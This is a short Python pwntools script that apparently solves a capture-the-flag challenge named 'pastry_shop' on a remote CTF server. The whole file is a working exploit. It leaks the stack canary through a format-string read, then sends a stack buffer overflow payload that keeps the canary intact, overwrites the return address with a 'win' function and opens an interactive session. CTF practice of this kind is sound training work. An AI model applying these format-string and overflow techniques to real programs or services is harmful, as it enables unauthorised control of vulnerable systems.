#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pastry_shop', checksec=False)

CANARY_IDX = 23
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

p = remote("offsec.m0lecon.it",13504)

p.recvuntil(b'dear customer?\n')
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b'to order?\n')
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()